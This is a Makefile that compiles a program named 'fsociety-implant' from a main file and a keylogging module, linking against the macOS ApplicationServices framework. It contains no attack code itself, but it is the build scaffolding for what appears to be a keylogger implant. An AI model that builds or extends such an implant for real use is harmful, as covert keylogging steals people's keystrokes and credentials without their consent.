CC     = gcc
CFLAGS = -Wall -Wextra -O2 -Iinclude

SRCS   = src/main.c \
         src/modules/keylog/keylog.c

TARGET = fsociety-implant

all: $(TARGET)

$(TARGET):
	$(CC) $(CFLAGS) $(SRCS) -o $(TARGET) -framework ApplicationServices

clean:
	rm -f $(TARGET)
